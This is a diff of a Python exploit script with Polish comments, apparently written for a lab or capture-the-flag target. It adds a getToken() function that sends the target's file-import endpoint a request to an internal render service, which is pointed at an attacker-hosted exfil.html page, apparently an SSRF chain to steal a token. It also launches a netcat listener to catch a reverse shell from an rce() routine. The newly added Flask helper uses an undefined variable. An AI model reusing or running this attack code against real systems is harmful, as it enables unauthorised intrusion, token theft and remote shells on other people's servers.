@@ -93,21 +93,54 @@ def rce(RHOST, LHOST, LPORT, RPORT):
         print(f"Błąd podczas wykonywania drugiego zapytania: {e}")
         return None
 
+def getToken():
+    api_gateway_url = f"http://{RHOST}/files/import"
+    headers = {
+        "Content-Type": "application/json"
+    }
+    payload = {
+        "url": f"http://172.16.16.5:9000/api/render?url=http://{LHOST}/exfil.html"
+    }
+
+    response = requests.post(api_gateway_url, headers=headers, data=json.dumps(payload))
+
+    if response.status_code == 200:
+        print("Request successful!")
+        print("Response:", response.text)
+    else:
+        print(f"Request failed with status code {response.status_code}")
+        print("Response:", response.text)
+
 def startListener(port):
     try:
         # Uruchomienie listenera netcat w nowym terminalu
         command = f"terminator -e 'nc -nlvp {port}; exec bash'"
         process = subprocess.Popen(command, shell=True)
-        print(f"Netcat listener started on port {port} in a new terminal.")
+        print(f"[+] Netcat listener started on port {port} in a new terminal.")
         return process
     except Exception as e:
-        print(f"Failed to start netcat listener: {e}")
+        print(f"[-] Failed to start netcat listener: {e}")
+        return None
+
+def startFlaskServer():
+    try:
+        # Uruchomienie listenera netcat w nowym terminalu
+        command = f"terminator -e 'python3 flask_server.py'"
+        process = subprocess.Popen(command, shell=True)
+        print(f"[+] Flask server started on port {port} in a new terminal.")
+        return process
+    except Exception as e:
+        print(f"[-] Failed to start server listener: {e}")
         return None
 
 print(LHOST)
-payload = generatePayload(LHOST, LPORT)
-startListener(LPORT)
+#payload = generatePayload(LHOST, LPORT)
 
-response = rce(RHOST, LHOST, LPORT, RPORT)
-if response:
-    print(f"Zawartość odpowiedzi drugiego zapytania:\n{response}")
+#starting new terminals with listener and flask server
+#startListener(LPORT)
+#startFlaskServer()
+getToken()
+
+#response = rce(RHOST, LHOST, LPORT, RPORT)
+#if response:
+#    print(f"Zawartość odpowiedzi drugiego zapytania:\n{response}")
